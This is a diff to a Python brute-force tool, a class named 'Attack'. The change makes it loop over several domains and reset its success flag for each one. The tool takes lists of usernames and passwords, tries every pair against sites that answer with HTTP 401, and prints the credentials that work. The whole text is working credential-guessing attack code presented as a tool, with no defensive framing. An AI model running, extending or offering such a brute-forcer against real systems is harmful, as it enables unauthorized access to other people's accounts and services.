@@ -29,7 +29,7 @@ class Attack:
         #self.parser.add_argument('-t', '--threads', required=False, type=int, choices=range(1, 10), default=1)
         self.parser.add_argument('-v', action='store_true', default=False, help="you can upload a txt file filled with usernames")
         self.args = self.parser.parse_args()
-        self.status = None
+        self.status = False
         self.loader()
     
     def loader(self):
@@ -61,27 +61,28 @@ class Attack:
         if (self.args.domain):
             self.domains.append(self.args.domain)
         
-        for i in self.domains:
-            self.bruter(i, self.users, self.passwords, self.args.v)
+        self.bruter(self.domains, self.users, self.passwords, self.args.v)
                                 
     def bruter(self, url, users, passwords, verbose):
         try:
-            url = "http://" + url
-            r = requests.get(url)
-            if r.status_code == 401:
-                for user in users:
-                    for passw in passwords:
-                        resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw))
-                        if (resp.status_code == 200):
-                            print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
-                            self.status = True
+            for url in self.domains:
+                url = "http://" + url
+                r = requests.get(url)
+                self.status = False
+                if r.status_code == 401:
+                    for user in users:
+                        for passw in passwords:
+                            resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw))
+                            if (resp.status_code == 200):
+                                print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
+                                self.status = True
+                                break
+                            elif(verbose == True):
+                                print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
+                        if self.status == True:
                             break
-                        elif(verbose == True):
-                            print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
-                    if self.status == True:
-                        break
-            elif(verbose==True):
-                print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
+                elif(verbose==True):
+                    print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
         except requests.ConnectionError:
             pass
 
